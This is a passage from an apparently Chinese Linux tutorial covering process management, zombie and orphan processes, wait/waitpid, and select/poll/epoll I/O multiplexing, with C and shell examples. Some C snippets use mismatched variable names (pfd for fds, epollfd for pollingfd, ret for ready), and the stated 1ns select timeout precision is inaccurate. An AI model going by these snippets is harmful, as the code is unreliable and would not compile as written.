的数据进行处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd | awk &apos;BEGIN &#123;FS=&quot;:&quot;&#125; $3 &lt; 10 &#123;print $1 &quot;\t &quot; $3&#125;&apos;</span><br><span class="line">root 0</span><br><span class="line">bin 1</span><br><span class="line">daemon 2</span><br></pre></td></tr></table></figure><h1 id="十、进程管理"><a href="#十、进程管理" class="headerlink" title="十、进程管理"></a>十、进程管理</h1><h2 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h2><h3 id="1-ps"><a href="#1-ps" class="headerlink" title="1. ps"></a>1. ps</h3><p>查看某个时间点的进程信息</p><p>示例一：查看自己的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ps -l</span></span><br></pre></td></tr></table></figure><p>示例二：查看系统所有进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ps aux</span></span><br></pre></td></tr></table></figure><p>示例三：查看特定的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ps aux | grep threadx</span></span><br></pre></td></tr></table></figure><h3 id="2-top"><a href="#2-top" class="headerlink" title="2. top"></a>2. top</h3><p>实时显示进程信息</p><p>示例：两秒钟刷新一次</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> top -d 2</span></span><br></pre></td></tr></table></figure><h3 id="3-pstree"><a href="#3-pstree" class="headerlink" title="3. pstree"></a>3. pstree</h3><p>查看进程树</p><p>示例：查看所有进程树</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pstree -A</span></span><br></pre></td></tr></table></figure><h3 id="4-netstat"><a href="#4-netstat" class="headerlink" title="4. netstat"></a>4. netstat</h3><p>查看占用端口的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> netstat -anp | grep port</span></span><br></pre></td></tr></table></figure><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p><div align="center"> <img src="/images/posts/76a49594323247f21c9b3a69945445ee.png" width=""> </div><br></p><table><thead><tr><th style="text-align:center">状态</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center">R</td><td>running or runnable (on run queue)</td></tr><tr><td style="text-align:center">D</td><td>uninterruptible sleep (usually IO)</td></tr><tr><td style="text-align:center">S</td><td>interruptible sleep (waiting for an event to complete)</td></tr><tr><td style="text-align:center">Z</td><td>defunct/zombie, terminated but not reaped by its parent</td></tr><tr><td style="text-align:center">T</td><td>stopped, either by a job control signal or because it is being traced</td></tr></tbody></table><h2 id="SIGCHLD"><a href="#SIGCHLD" class="headerlink" title="SIGCHLD"></a>SIGCHLD</h2><p>当一个子进程改变了它的状态时：停止运行，继续运行或者退出，有两件事会发生在父进程中：</p><ul><li>得到 SIGCHLD 信号；</li><li>waitpid() 或者 wait() 调用会返回。</li></ul><p><div align="center"> <img src="/images/posts/flow.png" width=""> </div><br></p><p>其中子进程发送的 SIGCHLD 信号包含了子进程的信息，包含了进程 ID、进程状态、进程使用 CPU 的时间等。</p><p>在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息。父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。</p><h2 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> wait(<span class="keyword">int</span> *status)</span><br></pre></td></tr></table></figure><p>父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。</p><p>如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 - 1，同时 errno 被置为 ECHILD。</p><p>参数 status 用来保存被收集进程退出时的一些状态，如果我们对这个子进程是如何死掉的毫不在意，只想把这个僵尸进程消灭掉，我们就可以设定这个参数为 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid = wait(<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid()"></a>waitpid()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span><br></pre></td></tr></table></figure><p>作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。</p><p>pid 参数指示一个子进程的 ID，表示只关心这个子进程的退出 SIGCHLD 信号。如果 pid=-1 时，那么贺 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。</p><p>options 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。</p><h2 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h2><p>一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。</p><p>由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。</p><h2 id="僵死进程"><a href="#僵死进程" class="headerlink" title="僵死进程"></a>僵死进程</h2><p>一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵死进程。</p><p>僵死进程通过 ps 命令显示出来的状态为 Z。</p><p>系统所能使用的进程号是有限的，如果大量的产生僵死进程，将因为没有可用的进程号而导致系统不能产生新的进程。</p><p>要消灭系统中大量的僵死进程，只需要将其父进程杀死，此时所有的僵死进程就会变成孤儿进程，从而被 init 所收养，这样 init 就会释放所有的僵死进程所占有的资源，从而结束僵死进程。</p><h1 id="十一、I-O-复用"><a href="#十一、I-O-复用" class="headerlink" title="十一、I/O 复用"></a>十一、I/O 复用</h1><h2 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h2><p>I/O Multiplexing 又被称为 Event Driven I/O，它可以让单个进程具有处理多个 I/O 事件的能力。</p><p>当某个 I/O 事件条件满足时，进程会收到通知。</p><p>如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时连接几万个连接，那么就需要创建相同数量的线程。并且相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。</p><h2 id="I-O-模型"><a href="#I-O-模型" class="headerlink" title="I/O 模型"></a>I/O 模型</h2><ul><li>阻塞（Blocking）</li><li>非阻塞（Non-blocking）</li><li>同步（Synchronous）</li><li>异步（Asynchronous）</li></ul><p>阻塞非阻塞是等待 I/O 完成的方式，阻塞要求用户程序停止执行，直到 I/O 完成，而非阻塞在 I/O 完成之前还可以继续执行。</p><p>同步异步是获知 I/O 完成的方式，同步需要时刻关心 I/O 是否已经完成，异步无需主动关心，在 I/O 完成时它会收到通知。</p><p><div align="center"> <img src="/images/posts/1a231f2a-5c2f-4231-8e0f-915aa5894347.jpg" width=""> </div><br></p><h3 id="1-同步-阻塞"><a href="#1-同步-阻塞" class="headerlink" title="1. 同步-阻塞"></a>1. 同步-阻塞</h3><p>这是最常见的一种模型，用户程序在使用 read() 时会执行系统调用从而陷入内核，之后就被阻塞直到系统调用完成。</p><p>应该注意到，在阻塞的过程中，其他程序还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其他程序还可以执行，因此不消耗 CPU 时间，这种模型的执行效率会比较高。</p><p><div align="center"> <img src="/images/posts/5e9b10f3-9504-4483-9667-d4770adebf9f.png" width=""> </div><br></p><h3 id="2-同步-非阻塞"><a href="#2-同步-非阻塞" class="headerlink" title="2. 同步-非阻塞"></a>2. 同步-非阻塞</h3><p>非阻塞意味着用户程序在执行系统调用后还可以继续执行，内核并不是马上执行完 I/O，而是以一个错误码来告知用户程序 I/O 还未完成。为了获得 I/O 完成事件，用户程序必须调用多次系统调用去询问内核，甚至是忙等，也就是在一个循环里面一直询问并等待。</p><p>由于 CPU 要处理更多的用户程序的询问，因此这种模型的效率是比较低的。</p><p><div align="center"> <img src="/images/posts/1582217a-ed46-4cac-811e-90d13a65163b.png" width=""> </div><br></p><h3 id="3-异步"><a href="#3-异步" class="headerlink" title="3. 异步"></a>3. 异步</h3><p>该模式下，I/O 操作会立即返回，之后可以处理其它操作，并且在 I/O 完成时会收到一个通知，此时会中断正在处理的操作，然后继续之前的操作。</p><p><div align="center"> <img src="/images/posts/b4b29aa9-dd2c-467b-b75f-ca6541cb25b5.jpg" width=""> </div><br></p><h2 id="select-poll-epoll"><a href="#select-poll-epoll" class="headerlink" title="select poll epoll"></a>select poll epoll</h2><p>这三个都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。</p><h3 id="1-select"><a href="#1-select" class="headerlink" title="1. select"></a>1. select</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span> <span class="params">(<span class="keyword">int</span> n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>fd_set 表示描述符集合；</li><li>readset、writeset 和 exceptset 这三个参数指定让操作系统内核测试读、写和异常条件的描述符；</li><li>timeout 参数告知内核等待所指定描述符中的任何一个就绪可花多少时间；</li><li>成功调用返回结果大于 0；出错返回结果为 -1；超时返回结果为 0。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">fd_set fd_in, fd_out;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reset the sets</span></span><br><span class="line">FD_ZERO( &amp;fd_in );</span><br><span class="line">FD_ZERO( &amp;fd_out );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Monitor sock1 for input events</span></span><br><span class="line">FD_SET( sock1, &amp;fd_in );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Monitor sock2 for output events</span></span><br><span class="line">FD_SET( sock2, &amp;fd_out );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find out which socket has the largest numeric value as select requires it</span></span><br><span class="line"><span class="keyword">int</span> largest_sock = sock1 &gt; sock2 ? sock1 : sock2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait up to 10 seconds</span></span><br><span class="line">tv.tv_sec = <span class="number">10</span>;</span><br><span class="line">tv.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the select</span></span><br><span class="line"><span class="keyword">int</span> ret = select( largest_sock + <span class="number">1</span>, &amp;fd_in, &amp;fd_out, <span class="literal">NULL</span>, &amp;tv );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if select actually succeed</span></span><br><span class="line"><span class="keyword">if</span> ( ret == <span class="number">-1</span> )</span><br><span class="line">    <span class="comment">// report error and abort</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( ret == <span class="number">0</span> )</span><br><span class="line">    <span class="comment">// timeout; no event detected</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( FD_ISSET( sock1, &amp;fd_in ) )</span><br><span class="line">        <span class="comment">// input event on sock1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( FD_ISSET( sock2, &amp;fd_out ) )</span><br><span class="line">        <span class="comment">// output event on sock2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次调用 select() 都需要将 fd_set *readfds, fd_set *writefds, fd_set *exceptfds 链表内容全部从用户进程内存中复制到操作系统内核中，内核需要将所有 fd_set 遍历一遍，这个过程非常低效。</p><p>返回结果中内核并没有声明哪些 fd_set 已经准备好了，所以如果返回值大于 0 时，程序需要遍历所有的 fd_set 判断哪个 I/O 已经准备好。</p><p>在 Linux 中 select 最多支持 1024 个 fd_set 同时轮询，其中 1024 由 Linux 内核的 FD_SETSIZE 决定。如果需要打破该限制可以修改 FD_SETSIZE，然后重新编译内核。</p><h3 id="2-poll"><a href="#2-poll" class="headerlink" title="2. poll"></a>2. poll</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span> <span class="params">(struct pollfd *fds, <span class="keyword">unsigned</span> <span class="keyword">int</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> fd;       <span class="comment">//文件描述符</span></span><br><span class="line">    <span class="keyword">short</span> events; <span class="comment">//监视的请求事件</span></span><br><span class="line">    <span class="keyword">short</span> revents; <span class="comment">//已发生的事件</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The structure for two events</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">fds</span>[2];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Monitor sock1 for input</span></span><br><span class="line">fds[<span class="number">0</span>].fd = sock1;</span><br><span class="line">fds[<span class="number">0</span>].events = POLLIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Monitor sock2 for output</span></span><br><span class="line">fds[<span class="number">1</span>].fd = sock2;</span><br><span class="line">fds[<span class="number">1</span>].events = POLLOUT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait 10 seconds</span></span><br><span class="line"><span class="keyword">int</span> ret = poll( &amp;fds, <span class="number">2</span>, <span class="number">10000</span> );</span><br><span class="line"><span class="comment">// Check if poll actually succeed</span></span><br><span class="line"><span class="keyword">if</span> ( ret == <span class="number">-1</span> )</span><br><span class="line">    <span class="comment">// report error and abort</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( ret == <span class="number">0</span> )</span><br><span class="line">    <span class="comment">// timeout; no event detected</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// If we detect the event, zero it out so we can reuse the structure</span></span><br><span class="line">    <span class="keyword">if</span> ( pfd[<span class="number">0</span>].revents &amp; POLLIN )</span><br><span class="line">        pfd[<span class="number">0</span>].revents = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// input event on sock1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( pfd[<span class="number">1</span>].revents &amp; POLLOUT )</span><br><span class="line">        pfd[<span class="number">1</span>].revents = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// output event on sock2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它和 select() 功能基本相同。同样需要每次将 struct pollfd *fds 复制到内核，返回后同样需要进行轮询每一个 pollfd 是否已经 I/O 准备好。poll() 取消了 1024 个描述符数量上限，但是数量太大以后不能保证执行效率，因为复制大量内存到内核十分低效，所需时间与描述符数量成正比。poll() 在 pollfd 的重复利用上比 select() 的 fd_set 会更好。</p><p>如果在多线程下，如果一个线程对某个描述符调用了 poll() 系统调用，但是另一个线程关闭了该描述符，会导致 poll() 调用结果不确定，该问题同样出现在 select() 中。</p><h3 id="3-epoll"><a href="#3-epoll" class="headerlink" title="3. epoll"></a>3. epoll</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span>;</span><br><span class="line">int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd, struct epoll_event * events, <span class="keyword">int</span> maxevents, <span class="keyword">int</span> timeout)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.</span></span><br><span class="line"><span class="comment">// The function argument is ignored (it was not before, but now it is), so put your favorite number here</span></span><br><span class="line"><span class="keyword">int</span> pollingfd = epoll_create( <span class="number">0xCAFE</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( pollingfd &lt; <span class="number">0</span> )</span><br><span class="line"> <span class="comment">// report error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the epoll structure in case more members are added in future</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">ev</span> = &#123;</span> <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Associate the connection class instance with the event. You can associate anything</span></span><br><span class="line"><span class="comment">// you want, epoll does not use this information. We store a connection class pointer, pConnection1</span></span><br><span class="line">ev.data.ptr = pConnection1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Monitor for input, and do not automatically rearm the descriptor after the event</span></span><br><span class="line">ev.events = EPOLLIN | EPOLLONESHOT;</span><br><span class="line"><span class="comment">// Add the descriptor into the monitoring list. We can do it even if another thread is</span></span><br><span class="line"><span class="comment">// waiting in epoll_wait - the descriptor will be properly added</span></span><br><span class="line"><span class="keyword">if</span> ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != <span class="number">0</span> )</span><br><span class="line">    <span class="comment">// report error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">pevents</span>[ 20 ];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array</span></span><br><span class="line"><span class="keyword">int</span> ready = epoll_wait( pollingfd, pevents, <span class="number">20</span>, <span class="number">10000</span> );</span><br><span class="line"><span class="comment">// Check if epoll actually succeed</span></span><br><span class="line"><span class="keyword">if</span> ( ret == <span class="number">-1</span> )</span><br><span class="line">    <span class="comment">// report error and abort</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( ret == <span class="number">0</span> )</span><br><span class="line">    <span class="comment">// timeout; no event detected</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Check if any events detected</span></span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ret; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( pevents[i].events &amp; EPOLLIN )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Get back our connection pointer</span></span><br><span class="line">            Connection * c = (Connection*) pevents[i].data.ptr;</span><br><span class="line">            c-&gt;handleReadEvent();</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>epoll 仅仅适用于 Linux OS。</p><p>它是 select 和 poll 的增强版，更加灵活而且没有描述符限制。它将用户关心的描述符放到内核的一个事件表中，从而只需要在用户空间和内核空间拷贝一次。</p><p>select 和 poll 方式中，进程只有在调用一定的方法后，内核才对所有监视的描述符进行扫描。而 epoll 事先通过 epoll_ctl() 来注册描述符，一旦基于某个描述符就绪时，内核会采用类似 callback 的回调机制，迅速激活这个描述符，当进程调用 epoll_wait() 时便得到通知。</p><p>新版本的 epoll_create(int size) 参数 size 不起任何作用，在旧版本的 epoll 中如果描述符的数量大于 size，不保证服务质量。</p><p>epoll_ctl() 执行一次系统调用，用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理。</p><p>epoll_wait() 取出在内核中通过链表维护的 I/O 准备好的描述符，将他们从内核复制到程序中，不需要像 select/poll 对注册的所有描述符遍历一遍。</p><p>epoll 对多线程编程更有友好，同时多个线程对同一个描述符调用了 epoll_wait 也不会产生像 select/poll 的不确定情况。或者一个线程调用了 epoll_wait 另一个线程关闭了同一个描述符也不会产生不确定情况。</p><h2 id="select-和-poll-比较"><a href="#select-和-poll-比较" class="headerlink" title="select 和 poll 比较"></a>select 和 poll 比较</h2><h3 id="1-功能"><a href="#1-功能" class="headerlink" title="1. 功能"></a>1. 功能</h3><p>它们提供了几乎相同的功能，但是在一些细节上有所不同：</p><ul><li>select 会修改 fd_set 参数，而 poll 不会；</li><li>select 默认只能监听 1024 个描述符，如果要监听更多的话，需要修改 FD_SETSIZE 之后重新编译；</li><li>poll 提供了更多的事件类型。</li></ul><h3 id="2-速度"><a href="#2-速度" class="headerlink" title="2. 速度"></a>2. 速度</h3><p>poll 和 select 在速度上都很慢。</p><ul><li>它们都采取轮询的方式来找到 I/O 完成的描述符，如果描述符很多，那么速度就会很慢；</li><li>select 只使用每个描述符的 3 位，而 poll 通常需要使用 64 位，因此 poll 需要复制更多的内核空间。</li></ul><h3 id="3-可移植性"><a href="#3-可移植性" class="headerlink" title="3. 可移植性"></a>3. 可移植性</h3><p>几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。</p><h2 id="eopll-工作模式"><a href="#eopll-工作模式" class="headerlink" title="eopll 工作模式"></a>eopll 工作模式</h2><p>epoll_event 有两种触发模式：LT（level trigger）和 ET（edge trigger）。</p><h3 id="1-LT-模式"><a href="#1-LT-模式" class="headerlink" title="1. LT 模式"></a>1. LT 模式</h3><p>当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用 epoll_wait() 时，会再次响应应用程序并通知此事件。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。</p><h3 id="2-ET-模式"><a href="#2-ET-模式" class="headerlink" title="2. ET 模式"></a>2. ET 模式</h3><p>当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用 epoll_wait() 时，不会再次响应应用程序并通知此事件。很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。</p><h2 id="select-poll-epoll-应用场景"><a href="#select-poll-epoll-应用场景" class="headerlink" title="select poll epoll 应用场景"></a>select poll epoll 应用场景</h2><p>很容易产生一种错觉认为只要用 epoll 就可以了，select poll 都是历史遗留问题，并没有什么应用场景，其实并不是这样的。</p><h3 id="1-select-应用场景"><a href="#1-select-应用场景" class="headerlink" title="1. select 应用场景"></a>1. select 应用场景</h3><p>select() poll() epoll_wait() 都有一个 timeout 参数，在 select() 中 timeout 的精确度为 1ns，而 poll() 和 epoll_wait() 中则为 1ms。所以 select 更加适用于实时要求更高的场景，比如核反应堆的控制。</p><p>select 历史更加悠久，它的可移植性更好，几乎被所有主流平台所支持。</p><h3 id="2-poll-应用场景"><a href="#2-poll-应用场景" class="headerlink" title="2. poll 应用场景"></a>2. poll 应用场景</h3><p>poll 没有最大描述符数量的限制，如果平台支持应该采用 poll 且对实时性要求并不是十分严格，而不是 select。</p><p>需要同时监控小于 1000 个描述符。那么也没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。</p><p>需要监控的描述符状态变化多，而且都是非常短暂的。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。epoll 的描述符存储在内核，不容易调试。</p><h3 id="3-epoll-应用场景"><a href="#3-epoll-应用场景" class="headerlink" title="3. epoll 应用场景"></a>3. epoll 应用场景</h3><p>程序只需要运行在 Linux 平台上，有非常大量的描述符需要同时轮询，而且这些连接最好是长连接。</p><h3 id="4-性能对比"><a href="#4-性能对比" class="headerlink" title="4. 性能对比"></a>4. 性能对比</h3><blockquote><p><a href="http://lse.sourceforge.net/epoll/index.html" target="_blank" rel="noopener">epoll Scalability Web Page</a></p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009.</li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-rpmdpkg/index.html" target="_blank" rel="noopener">Linux 平台上的软件包管理</a></li><li><a href="https://www.ibm.com/developerworks/linux/library/l-async/" target="_blank" rel="noopener">Boost application performance using asynchronous I/O</a></li><li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365683(v=vs.85" target="_blank" rel="noopener">Synchronous and Asynchronous I/O</a>.aspx)</li><li><a href="https://segmentfault.com/a/1190000003063859" target="_blank" rel="noopener">Linux IO 模式及 select、poll、epoll 详解</a></li><li><a href="https://daniel.haxx.se/docs/poll-vs-select.html" target="_blank" rel="noopener">poll vs select vs event-based</a></li><li><a href="http://liubigbin.github.io/2016/03/11/Linux-%E4%B9%8B%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E3%80%81%E5%83%B5%E6%AD%BB%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/" target="_blank" rel="noopener">Linux 之守护进程、僵死进程与孤儿进程</a></li><li><a href="https://idea.popcount.org/2012-12-11-linux-process-states/" target="_blank" rel="noopener">Linux process states</a></li><li><a href="https://en.wikipedia.org/wiki/GUID_Partition_Table" target="_blank" rel="noopener">GUID Partition Table</a></li><li><a href="https://blog.csdn.net/kevinhg/article/details/7001719" target="_blank" rel="noopener">详解 wait 和 waitpid 函数</a></li><li><a href="https://blog.csdn.net/tianlesoftware/article/details/6009110" target="_blank" rel="noopener">IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍</a></li><li><a href="http://www.mpchunter.com/s3000/akai-ib-301s-scsi-interface-for-s2800s3000/" target="_blank" rel="noopener">Akai IB-301S SCSI Interface for S2800,S3000</a></li><li><a href="https://en.wikipedia.org/wiki/Parallel_ATA" target="_blank" rel="noopener">Parallel ATA</a></li><li><a 